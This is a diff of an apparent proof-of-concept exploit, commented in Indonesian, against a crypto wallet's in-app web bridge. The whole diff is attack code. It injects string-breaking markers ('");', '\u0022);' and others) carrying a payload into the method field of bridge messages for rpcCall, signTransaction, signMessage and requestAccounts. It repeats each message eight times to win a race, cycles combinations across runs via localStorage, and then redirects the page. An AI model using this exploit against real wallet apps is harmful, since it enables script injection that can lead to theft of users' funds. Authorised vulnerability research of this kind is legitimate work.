@@ -38,13 +38,24 @@
       '})();'
     ];
 
-    // --- MODIFIKASI MINIMAL: beberapa penutup + beberapa handler, sisanya tetap ---
+    // --- MODIFIKASI: daftar kombinasi, diuji SATU per RUN ---
     const payload = impactStatements.join(' ');
     const closers = ['");', "');", '`);', '\\";', '\\u0022);'];
     const handlers = ['rpcCall', 'signMessage', 'signPersonalMessage',
                       'signTransaction', 'requestAccounts'];
-    const markers = closers.map(c => `zz_${c}${payload}//`);
-    // ----------------------------------------------------------------------------
+    const combos = [];
+    for (const name of handlers)
+      for (const c of closers)
+        combos.push({ name, closer: c, marker: `zz_${c}${payload}//` });
+
+    // indeks tersimpan supaya tiap RUN maju ke kombinasi berikutnya
+    let idx = 0;
+    try { idx = parseInt(localStorage.getItem('tw_combo_idx') || '0', 10) || 0; } catch (e) {}
+    if (idx >= combos.length) idx = 0;
+    const cur = combos[idx];
+    status.textContent =
+      `Siap uji #${idx + 1}/${combos.length}: name=${cur.name} closer=[${cur.closer}]. Tap RUN.`;
+    // -------------------------------------------------------
 
     runLink.addEventListener('click', event => {
       event.preventDefault();
@@ -60,31 +71,32 @@
       const baseId = Math.trunc(Date.now() % 9000000000000000);
       let sent = 0;
 
-      // MODIFIKASI: loop atas (handler x marker) menggantikan 8x rpcCall/method saja.
-      let i = 0;
-      for (const name of handlers) {
-        for (const marker of markers) {
-          try {
-            bridge.postMessage({
-              id: baseId + i,
-              network: 'ethereum',
-              name: name,
-              object: {
-                method: marker,
-                params: [marker],   // sisipkan juga di params (sisa struktur tetap)
-                jsonrpc: '2.0'
-              }
-            });
-            sent++;
-          } catch (error) {
-            status.textContent =
-              `Bridge menolak request ke-${i + 1}: ${String(error)}`;
-          }
-          i++;
+      // Hanya SATU kombinasi (cur), tetap 8x seperti PoC asli untuk memenangkan race.
+      for (let i = 0; i < 8; i++) {
+        try {
+          bridge.postMessage({
+            id: baseId + i,
+            network: 'ethereum',
+            name: cur.name,
+            object: {
+              method: cur.marker,
+              params: [],
+              jsonrpc: '2.0'
+            }
+          });
+          sent++;
+        } catch (error) {
+          status.textContent =
+            `Bridge menolak request ke-${i + 1}: ${String(error)}`;
+          break;
         }
       }
 
-      status.textContent = `${sent} request RPC dikirim; navigasi ke ${target}`;
+      // majukan indeks untuk RUN berikutnya
+      try { localStorage.setItem('tw_combo_idx', String((idx + 1) % combos.length)); } catch (e) {}
+
+      status.textContent =
+        `#${idx + 1} (${cur.name} / ${cur.closer}): ${sent} req dikirim; navigasi ke ${target}`;
       setTimeout(() => location.assign(target), 120);
     }, {once: true});
   </script>
